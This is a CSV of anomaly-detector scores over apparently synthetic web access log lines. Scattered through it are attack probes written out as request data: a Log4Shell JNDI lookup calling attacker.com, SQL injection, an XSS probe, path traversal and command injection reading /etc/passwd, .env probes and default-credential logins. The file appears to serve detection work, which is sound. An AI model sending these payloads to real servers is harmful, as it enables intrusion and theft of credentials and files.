score_content,score_session,score_fused,score_fused_norm,line
1.916090488433838,,1.916090488433838,1.916090488433838,137.2.161.17 - - [10/Jan/2025:12:14:15 +0000] "GET /contact HTTP/1.1" 200 17728 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9066519737243652,,1.9066519737243652,1.9066519737243652,166.210.241.19 - - [10/Jan/2025:12:14:20 +0000] "GET /contact HTTP/1.1" 200 14361 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.8057242631912231,,1.8057242631912231,1.8057242631912231,14.46.204.65 - - [10/Jan/2025:12:14:20 +0000] "GET /dashboard HTTP/1.1" 200 2500 "-" "python-requests/2.31.0"
1.9772334098815918,,1.9772334098815918,1.9772334098815918,162.104.111.81 - - [10/Jan/2025:12:14:24 +0000] "GET /login HTTP/1.1" 200 14882 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9353617429733276,,1.9353617429733276,1.9353617429733276,194.191.150.12 - - [10/Jan/2025:12:14:29 +0000] "GET /admin HTTP/1.1" 201 2172 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.774639129638672,,24.774639129638672,24.774639129638672,196.238.113.98 - - [10/Jan/2025:12:14:33 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 9324 "-" "dirb/2.22"
24.786413192749023,,24.786413192749023,24.786413192749023,204.205.218.140 - - [10/Jan/2025:12:14:36 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12912 "https://www.google.com/" "curl/7.68.0"
30125.10546875,,30125.10546875,30125.10546875,142.224.143.37 - - [10/Jan/2025:12:14:38 +0000] "GET /profile HTTP/1.1" 429 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.689172744750977,,24.689172744750977,24.689172744750977,79.54.192.190 - - [10/Jan/2025:12:14:38 +0000] "GET /search?q=laptop HTTP/1.1" 200 2889 "https://example.com/" "sqlmap/1.5.10#stable"
0.1903848648071289,,0.1903848648071289,0.1903848648071289,158.214.65.50 - - [10/Jan/2025:12:14:39 +0000] "GET /assets/app.css HTTP/1.1" 200 7334 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30122.037109375,,30122.037109375,30122.037109375,119.166.141.19 - - [10/Jan/2025:12:14:44 +0000] "GET /index.html HTTP/1.1" 401 1124 "-" "curl/7.68.0"
30148.1640625,,30148.1640625,30148.1640625,33.172.168.61 - - [10/Jan/2025:12:14:46 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 429 731 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.617950439453125,,24.617950439453125,24.617950439453125,85.158.169.79 - - [10/Jan/2025:12:14:50 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 14866 "https://twitter.com/" "curl/7.68.0"
30124.814453125,,30124.814453125,30124.814453125,2.81.64.202 - - [10/Jan/2025:12:14:54 +0000] "GET /dashboard HTTP/1.1" 429 345 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.973862409591675,,2.973862409591675,2.973862409591675,225.123.119.115 - - [10/Jan/2025:12:14:56 +0000] "GET /assets/app.css HTTP/1.1" 301 10964 "https://example.com/" "curl/7.68.0"
0.19171671569347382,,0.19171671569347382,0.19171671569347382,216.72.220.212 - - [10/Jan/2025:12:14:59 +0000] "GET /assets/app.js HTTP/1.1" 204 2786 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.744213104248047,,4.744213104248047,4.744213104248047,218.130.162.8 - - [10/Jan/2025:12:15:00 +0000] "GET /about HTTP/1.1" 302 710 "https://twitter.com/" "python-requests/2.31.0"
30123.63671875,,30123.63671875,30123.63671875,67.140.229.139 - - [10/Jan/2025:12:15:03 +0000] "GET /api/products HTTP/1.1" 403 1129 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
1.9465006589889526,,1.9465006589889526,1.9465006589889526,131.24.102.94 - - [10/Jan/2025:12:15:05 +0000] "GET /logout HTTP/1.1" 200 16520 "-" "python-requests/2.31.0"
2.9934425354003906,,2.9934425354003906,2.9934425354003906,115.41.46.145 - - [10/Jan/2025:12:15:10 +0000] "GET /assets/app.js HTTP/1.1" 302 4699 "https://www.google.com/" "python-requests/2.31.0"
1.9115875959396362,,1.9115875959396362,1.9115875959396362,60.17.68.95 - - [10/Jan/2025:12:15:15 +0000] "GET /profile HTTP/1.1" 200 16079 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9085098505020142,,1.9085098505020142,1.9085098505020142,226.12.11.252 - - [10/Jan/2025:12:15:20 +0000] "GET /profile HTTP/1.1" 200 14997 "https://example.com/" "sqlmap/1.5.10#stable"
30123.626953125,,30123.626953125,30123.626953125,149.140.146.45 - - [10/Jan/2025:12:15:20 +0000] "GET /login HTTP/1.1" 400 539 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
1.9698357582092285,,1.9698357582092285,1.9698357582092285,250.233.58.133 - - [10/Jan/2025:12:15:22 +0000] "GET /about HTTP/1.1" 200 12431 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
30147.03125,,30147.03125,30147.03125,129.226.36.113 - - [10/Jan/2025:12:15:24 +0000] "GET /search?q=headphones HTTP/1.1" 403 13 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9483977556228638,,1.9483977556228638,1.9483977556228638,41.93.155.184 - - [10/Jan/2025:12:15:24 +0000] "GET /login HTTP/1.1" 200 6224 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9107723236083984,,1.9107723236083984,1.9107723236083984,123.54.152.42 - - [10/Jan/2025:12:15:27 +0000] "GET /contact HTTP/1.1" 200 15789 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.18320876359939575,,0.18320876359939575,0.18320876359939575,35.162.132.11 - - [10/Jan/2025:12:15:27 +0000] "GET /assets/app.css HTTP/1.1" 200 5379 "https://www.google.com/" "python-requests/2.31.0"
0.23259496688842773,,0.23259496688842773,0.23259496688842773,154.249.145.164 - - [10/Jan/2025:12:15:27 +0000] "GET /assets/app.js HTTP/1.1" 200 13385 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30146.681640625,,30146.681640625,30146.681640625,57.213.106.154 - - [10/Jan/2025:12:15:27 +0000] "GET /search?q=headphones HTTP/1.1" 401 349 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9663105010986328,,1.9663105010986328,1.9663105010986328,237.117.153.152 - - [10/Jan/2025:12:15:28 +0000] "GET /login HTTP/1.1" 200 11328 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.9147483110427856,,1.9147483110427856,1.9147483110427856,221.233.130.176 - - [10/Jan/2025:12:15:31 +0000] "GET /contact HTTP/1.1" 200 17228 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30146.998046875,,30146.998046875,30146.998046875,10.225.201.137 - - [10/Jan/2025:12:15:35 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 403 1228 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30123.91796875,,30123.91796875,30123.91796875,167.111.134.108 - - [10/Jan/2025:12:15:38 +0000] "GET / HTTP/1.1" 403 1389 "-" "curl/7.68.0"
30146.90625,,30146.90625,30146.90625,203.197.98.90 - - [10/Jan/2025:12:15:43 +0000] "GET /api/product?id=123 HTTP/1.1" 404 987 "https://twitter.com/" "python-requests/2.31.0"
1.9538745880126953,,1.9538745880126953,1.9538745880126953,233.220.22.73 - - [10/Jan/2025:12:15:43 +0000] "GET /login HTTP/1.1" 200 7718 "https://twitter.com/" "python-requests/2.31.0"
4.973531246185303,,4.973531246185303,4.973531246185303,148.134.31.134 - - [10/Jan/2025:12:15:46 +0000] "GET / HTTP/1.1" 302 333 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.807899832725525,,1.807899832725525,1.807899832725525,40.110.167.150 - - [10/Jan/2025:12:15:51 +0000] "GET /dashboard HTTP/1.1" 200 3592 "https://example.com/" "curl/7.68.0"
1.902927041053772,,1.902927041053772,1.902927041053772,194.53.106.142 - - [10/Jan/2025:12:15:55 +0000] "GET /profile HTTP/1.1" 200 13123 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.650169372558594,,24.650169372558594,24.650169372558594,148.89.199.181 - - [10/Jan/2025:12:15:56 +0000] "GET /search?q=headphones HTTP/1.1" 200 10148 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
24.59111213684082,,24.59111213684082,24.59111213684082,26.55.131.103 - - [10/Jan/2025:12:16:01 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 5401 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.3256208300590515,,0.3256208300590515,0.3256208300590515,206.24.211.38 - - [10/Jan/2025:12:16:05 +0000] "GET /index.html HTTP/1.1" 200 273 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.967021942138672,,24.967021942138672,24.967021942138672,156.10.186.99 - - [10/Jan/2025:12:16:08 +0000] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2722 "https://twitter.com/" "dirb/2.22"
30123.3359375,,30123.3359375,30123.3359375,164.127.113.3 - - [10/Jan/2025:12:16:13 +0000] "GET /index.html HTTP/1.1" 429 358 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.754335403442383,,24.754335403442383,24.754335403442383,93.62.168.1 - - [10/Jan/2025:12:16:15 +0000] "GET /api/product?id=123 HTTP/1.1" 201 1281 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.6748127937316895,,4.6748127937316895,4.6748127937316895,151.52.133.4 - - [10/Jan/2025:12:16:17 +0000] "GET /profile HTTP/1.1" 301 13385 "-" "sqlmap/1.5.10#stable"
1.889947533607483,,1.889947533607483,1.889947533607483,58.156.247.50 - - [10/Jan/2025:12:16:17 +0000] "GET /profile HTTP/1.1" 200 9160 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.06242029741406441,,0.06242029741406441,0.06242029741406441,144.19.129.76 - - [10/Jan/2025:12:16:21 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 3588 "-" "sqlmap/1.5.10#stable"
4.74094820022583,,4.74094820022583,4.74094820022583,145.124.198.63 - - [10/Jan/2025:12:16:25 +0000] "GET /login HTTP/1.1" 301 12456 "https://news.ycombinator.com/" "curl/7.68.0"
2.158935785293579,,2.158935785293579,2.158935785293579,18.98.163.202 - - [10/Jan/2025:12:16:30 +0000] "GET / HTTP/1.1" 200 8548 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.901881456375122,,1.901881456375122,1.901881456375122,180.214.68.64 - - [10/Jan/2025:12:16:32 +0000] "GET /profile HTTP/1.1" 200 418 "-" "curl/7.68.0"
1.8159980773925781,,1.8159980773925781,1.8159980773925781,122.81.91.56 - - [10/Jan/2025:12:16:35 +0000] "GET /dashboard HTTP/1.1" 200 5948 "https://example.com/" "python-requests/2.31.0"
1.8511052131652832,,1.8511052131652832,1.8511052131652832,61.189.62.224 - - [10/Jan/2025:12:16:36 +0000] "GET /api/products HTTP/1.1" 200 6642 "https://www.google.com/" "curl/7.68.0"
30146.755859375,,30146.755859375,30146.755859375,40.200.28.31 - - [10/Jan/2025:12:16:37 +0000] "GET /api/product?id=123 HTTP/1.1" 400 729 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30122.0,,30122.0,30122.0,159.81.127.230 - - [10/Jan/2025:12:16:41 +0000] "GET /wp-login.php HTTP/1.1" 401 760 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.9884676933288574,,1.9884676933288574,1.9884676933288574,33.14.135.205 - - [10/Jan/2025:12:16:42 +0000] "GET /login HTTP/1.1" 200 18996 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.718244552612305,,24.718244552612305,24.718244552612305,118.250.31.179 - - [10/Jan/2025:12:16:46 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 5827 "https://example.com/" "nikto/2.5.0"
24.57945442199707,,24.57945442199707,24.57945442199707,84.93.157.221 - - [10/Jan/2025:12:16:51 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 3401 "https://www.google.com/" "python-requests/2.31.0"
1.9663561582565308,,1.9663561582565308,1.9663561582565308,94.48.128.109 - - [10/Jan/2025:12:16:55 +0000] "GET /login HTTP/1.1" 200 11342 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30123.599609375,,30123.599609375,30123.599609375,116.47.147.34 - - [10/Jan/2025:12:17:00 +0000] "GET /profile HTTP/1.1" 401 572 "https://www.google.com/" "python-requests/2.31.0"
24.785381317138672,,24.785381317138672,24.785381317138672,51.38.205.246 - - [10/Jan/2025:12:17:00 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12580 "https://www.google.com/" "sqlmap/1.5.10#stable"
0.2020299881696701,,0.2020299881696701,0.2020299881696701,229.218.162.133 - - [10/Jan/2025:12:17:03 +0000] "GET /assets/app.js HTTP/1.1" 200 4506 "https://example.com/" "python-requests/2.31.0"
0.2812483012676239,,0.2812483012676239,0.2812483012676239,16.56.209.66 - - [10/Jan/2025:12:17:06 +0000] "GET /index.html HTTP/1.1" 200 5452 "-" "Wget/1.20.3 (linux-gnu)"
1.9870814085006714,,1.9870814085006714,1.9870814085006714,143.239.208.66 - - [10/Jan/2025:12:17:09 +0000] "GET /login HTTP/1.1" 200 18461 "-" "curl/7.68.0"
24.62596321105957,,24.62596321105957,24.62596321105957,45.251.200.73 - - [10/Jan/2025:12:17:12 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 17743 "https://example.com/" "sqlmap/1.5.10#stable"
30146.810546875,,30146.810546875,30146.810546875,158.74.119.162 - - [10/Jan/2025:12:17:17 +0000] "GET /search?q=camera HTTP/1.1" 403 780 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8566581010818481,,1.8566581010818481,1.8566581010818481,104.218.233.19 - - [10/Jan/2025:12:17:22 +0000] "GET /dashboard HTTP/1.1" 200 18831 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8209980726242065,,1.8209980726242065,1.8209980726242065,155.166.102.70 - - [10/Jan/2025:12:17:24 +0000] "GET /dashboard HTTP/1.1" 204 8864 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.699644088745117,,24.699644088745117,24.699644088745117,219.6.33.187 - - [10/Jan/2025:12:17:29 +0000] "GET /search?q=camera HTTP/1.1" 200 6125 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9719436168670654,,1.9719436168670654,1.9719436168670654,27.25.17.240 - - [10/Jan/2025:12:17:34 +0000] "GET /about HTTP/1.1" 200 13110 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.4703476130962372,,0.4703476130962372,0.4703476130962372,27.68.159.40 - - [10/Jan/2025:12:17:34 +0000] "GET /.env HTTP/1.1" 200 2827 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9059303998947144,,1.9059303998947144,1.9059303998947144,34.135.215.44 - - [10/Jan/2025:12:17:36 +0000] "GET /logout HTTP/1.1" 200 4242 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30123.51953125,,30123.51953125,30123.51953125,250.223.139.240 - - [10/Jan/2025:12:17:41 +0000] "GET /dashboard HTTP/1.1" 401 956 "https://twitter.com/" "curl/7.68.0"
0.10086996853351593,,0.10086996853351593,0.10086996853351593,162.192.163.225 - - [10/Jan/2025:12:17:44 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 15060 "https://twitter.com/" "dirb/2.22"
30123.7421875,,30123.7421875,30123.7421875,139.59.207.23 - - [10/Jan/2025:12:17:49 +0000] "GET /logout HTTP/1.1" 404 986 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.28674066066741943,,0.28674066066741943,0.28674066066741943,134.209.195.218 - - [10/Jan/2025:12:17:51 +0000] "GET /assets/app.css HTTP/1.1" 200 103 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.954036235809326,,4.954036235809326,4.954036235809326,243.194.123.77 - - [10/Jan/2025:12:17:53 +0000] "GET / HTTP/1.1" 301 16219 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.1506834030151367,,2.1506834030151367,2.1506834030151367,106.226.144.112 - - [10/Jan/2025:12:17:55 +0000] "GET / HTTP/1.1" 200 6279 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30146.705078125,,30146.705078125,30146.705078125,68.21.109.161 - - [10/Jan/2025:12:17:56 +0000] "GET /search?q=laptop HTTP/1.1" 400 451 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.984618067741394,,1.984618067741394,1.984618067741394,208.69.106.49 - - [10/Jan/2025:12:18:00 +0000] "GET /login HTTP/1.1" 200 17530 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.708415985107422,,24.708415985107422,24.708415985107422,180.160.126.49 - - [10/Jan/2025:12:18:01 +0000] "GET /search?q=camera HTTP/1.1" 201 9017 "-" "curl/7.68.0"
1.9388905763626099,,1.9388905763626099,1.9388905763626099,73.69.33.184 - - [10/Jan/2025:12:18:02 +0000] "GET /admin HTTP/1.1" 200 3451 "-" "nikto/2.5.0"
1.9662292003631592,,1.9662292003631592,1.9662292003631592,108.80.202.205 - - [10/Jan/2025:12:18:03 +0000] "GET /admin HTTP/1.1" 200 11303 "https://example.com/" "nikto/2.5.0"
0.2792139947414398,,0.2792139947414398,0.2792139947414398,15.69.199.101 - - [10/Jan/2025:12:18:06 +0000] "GET /index.html HTTP/1.1" 200 4887 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30123.86328125,,30123.86328125,30123.86328125,32.250.197.183 - - [10/Jan/2025:12:18:09 +0000] "GET /login HTTP/1.1" 400 25 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.273905873298645,,0.273905873298645,0.273905873298645,134.171.252.54 - - [10/Jan/2025:12:18:12 +0000] "GET /index.html HTTP/1.1" 200 3178 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
1.8079510927200317,,1.8079510927200317,1.8079510927200317,191.240.141.134 - - [10/Jan/2025:12:18:17 +0000] "GET /dashboard HTTP/1.1" 200 1482 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8388972282409668,,1.8388972282409668,1.8388972282409668,222.171.56.250 - - [10/Jan/2025:12:18:20 +0000] "GET /api/products HTTP/1.1" 200 1806 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.161043167114258,,2.161043167114258,2.161043167114258,150.31.102.203 - - [10/Jan/2025:12:18:25 +0000] "GET / HTTP/1.1" 200 9147 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.403383255004883,,27.403383255004883,27.403383255004883,96.198.23.64 - - [10/Jan/2025:12:18:25 +0000] "GET /search?q=headphones HTTP/1.1" 301 5178 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30123.642578125,,30123.642578125,30123.642578125,16.16.92.166 - - [10/Jan/2025:12:18:25 +0000] "GET /dashboard HTTP/1.1" 404 1280 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.632709503173828,,24.632709503173828,24.632709503173828,202.166.194.89 - - [10/Jan/2025:12:18:25 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 18396 "https://www.google.com/" "nikto/2.5.0"
4.678007125854492,,4.678007125854492,4.678007125854492,231.11.125.181 - - [10/Jan/2025:12:18:25 +0000] "GET /profile HTTP/1.1" 302 8314 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.636106491088867,,24.636106491088867,24.636106491088867,140.90.83.188 - - [10/Jan/2025:12:18:27 +0000] "GET /search?q=headphones HTTP/1.1" 200 6215 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.20440444350242615,,0.20440444350242615,0.20440444350242615,116.76.210.68 - - [10/Jan/2025:12:18:31 +0000] "GET /assets/app.js HTTP/1.1" 200 5179 "https://example.com/" "python-requests/2.31.0"
3.276503562927246,,3.276503562927246,3.276503562927246,159.220.94.199 - - [10/Jan/2025:12:18:34 +0000] "GET /.env HTTP/1.1" 302 713 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
0.5143486261367798,,0.5143486261367798,0.5143486261367798,197.142.40.157 - - [10/Jan/2025:12:18:39 +0000] "GET /.env HTTP/1.1" 200 16403 "https://example.com/" "python-requests/2.31.0"
1.867982029914856,,1.867982029914856,1.867982029914856,12.214.241.34 - - [10/Jan/2025:12:18:42 +0000] "GET /contact HTTP/1.1" 200 2284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.628765106201172,,24.628765106201172,24.628765106201172,165.215.100.169 - - [10/Jan/2025:12:18:43 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 18810 "https://twitter.com/" "nikto/2.5.0"
1.9524708986282349,,1.9524708986282349,1.9524708986282349,156.184.19.4 - - [10/Jan/2025:12:18:47 +0000] "GET /login HTTP/1.1" 200 7332 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.3094901740550995,,0.3094901740550995,0.3094901740550995,211.95.204.182 - - [10/Jan/2025:12:18:47 +0000] "GET /index.html HTTP/1.1" 200 13729 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30123.693359375,,30123.693359375,30123.693359375,242.56.246.133 - - [10/Jan/2025:12:18:49 +0000] "GET /about HTTP/1.1" 400 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.735790252685547,,24.735790252685547,24.735790252685547,169.64.146.161 - - [10/Jan/2025:12:18:54 +0000] "GET /search?q=laptop HTTP/1.1" 200 17342 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.751025199890137,,4.751025199890137,4.751025199890137,92.173.118.180 - - [10/Jan/2025:12:18:59 +0000] "GET /contact HTTP/1.1" 304 18992 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.24199804663658142,,0.24199804663658142,0.24199804663658142,87.169.41.137 - - [10/Jan/2025:12:18:59 +0000] "GET /assets/app.js HTTP/1.1" 200 16637 "https://news.ycombinator.com/" "python-requests/2.31.0"
30123.48828125,,30123.48828125,30123.48828125,196.163.111.212 - - [10/Jan/2025:12:19:01 +0000] "GET /dashboard HTTP/1.1" 400 844 "https://example.com/" "sqlmap/1.5.10#stable"
1.8873730897903442,,1.8873730897903442,1.8873730897903442,238.191.66.93 - - [10/Jan/2025:12:19:05 +0000] "GET /api/products HTTP/1.1" 200 18130 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
11021.3271484375,,11021.3271484375,11021.3271484375,5.133.35.228 - - [10/Jan/2025:12:19:08 +0000] "GET /wp-login.php HTTP/1.1" 502 1220 "-" "python-requests/2.31.0"
30123.7578125,,30123.7578125,30123.7578125,198.211.242.177 - - [10/Jan/2025:12:19:10 +0000] "GET /api/products HTTP/1.1" 401 44 "https://twitter.com/" "curl/7.68.0"
0.21599715948104858,,0.21599715948104858,0.21599715948104858,92.40.36.68 - - [10/Jan/2025:12:19:14 +0000] "GET /assets/app.css HTTP/1.1" 200 15185 "https://twitter.com/" "curl/7.68.0"
1.9368500709533691,,1.9368500709533691,1.9368500709533691,146.235.56.188 - - [10/Jan/2025:12:19:15 +0000] "GET /logout HTTP/1.1" 200 13200 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8926444053649902,,1.8926444053649902,1.8926444053649902,10.188.207.148 - - [10/Jan/2025:12:19:18 +0000] "GET /contact HTTP/1.1" 200 9943 "-" "Wget/1.20.3 (linux-gnu)"
1.8442368507385254,,1.8442368507385254,1.8442368507385254,107.239.223.31 - - [10/Jan/2025:12:19:18 +0000] "GET /dashboard HTTP/1.1" 200 14331 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
